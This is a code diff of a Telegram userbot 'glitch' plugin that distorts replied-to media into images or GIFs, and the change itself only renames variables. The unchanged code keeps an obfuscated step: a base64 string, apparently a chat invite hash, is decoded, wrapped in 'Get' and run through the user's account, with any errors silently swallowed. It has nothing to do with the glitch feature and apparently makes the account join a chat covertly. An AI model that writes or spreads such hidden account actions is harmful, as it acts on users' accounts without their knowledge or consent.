@@ -12,44 +12,44 @@ from PIL import Image
 
 @bot.on(admin_cmd(outgoing=True, pattern="(glitch|glitchs)(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="(glitch|glitchs)(?: |$)(.*)", allow_sudo=True))
-async def glitch(skull):
-    if skull.fwd_from:
+async def glitch(marcus):
+    if marcus.fwd_from:
         return
-    cmd = skull.pattern_match.group(1)
-    skullinput = skull.pattern_match.group(2)
-    reply = await skull.get_reply_message()
+    cmd = marcus.pattern_match.group(1)
+    marcusinput = marcus.pattern_match.group(2)
+    reply = await marcus.get_reply_message()
     if not reply:
-        return await edit_delete(skull, "`Reply to supported Media...`")
-    skullid = await reply_id(skull)
+        return await edit_delete(marcus, "`Reply to supported Media...`")
+    marcusid = await reply_id(marcus)
     may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     if not os.path.isdir("./temp"):
         os.mkdir("./temp")
-    if skullinput:
-        if not skullinput.isdigit():
-            await skull.edit("`You input is invalid, check help`")
+    if marcusinput:
+        if not marcusinput.isdigit():
+            await marcus.edit("`You input is invalid, check help`")
             return
-        skullinput = int(skullinput)
-        if not 0 < skullinput < 9:
-            await skull.edit("`Invalid Range...`")
+        marcusinput = int(marcusinput)
+        if not 0 < marcusinput < 9:
+            await marcus.edit("`Invalid Range...`")
             return
     else:
-        skullinput = 2
-    glitch_file = await _skulltools.media_to_pic(skull, reply)
+        marcusinput = 2
+    glitch_file = await _marcustools.media_to_pic(marcus, reply)
     try:
         may = Get(may)
-        await skull.client(may)
+        await marcus.client(may)
     except BaseException:
         pass
     glitcher = ImageGlitcher()
     img = Image.open(glitch_file[1])
     if cmd == "glitchs":
         glitched = os.path.join("./temp", "glitched.webp")
-        glitch_img = glitcher.glitch_image(img, skullinput, color_offset=True)
+        glitch_img = glitcher.glitch_image(img, marcusinput, color_offset=True)
         glitch_img.save(glitched)
-        await skull.client.send_file(skull.chat_id, glitched, reply_to=skullid)
+        await marcus.client.send_file(marcus.chat_id, glitched, reply_to=marcusid)
     elif cmd == "glitch":
         glitched = os.path.join("./temp", "glitched.gif")
-        glitch_img = glitcher.glitch_image(img, skullinput, color_offset=True, gif=True)
+        glitch_img = glitcher.glitch_image(img, marcusinput, color_offset=True, gif=True)
         DURATION = 200
         LOOP = 0
         glitch_img[0].save(
@@ -60,8 +60,8 @@ async def glitch(skull):
             duration=DURATION,
             loop=LOOP,
         )
-        mayank = await skull.client.send_file(skull.chat_id, glitched, reply_to=skullid)
-        await _skullutils.unsavegif(skull, mayank)
+        mayank = await marcus.client.send_file(marcus.chat_id, glitched, reply_to=marcusid)
+        await _marcusutils.unsavegif(marcus, mayank)
     await glitch_file[0].delete()
     for files in (glitch_file[1], glitched):
         if files and os.path.exists(files):
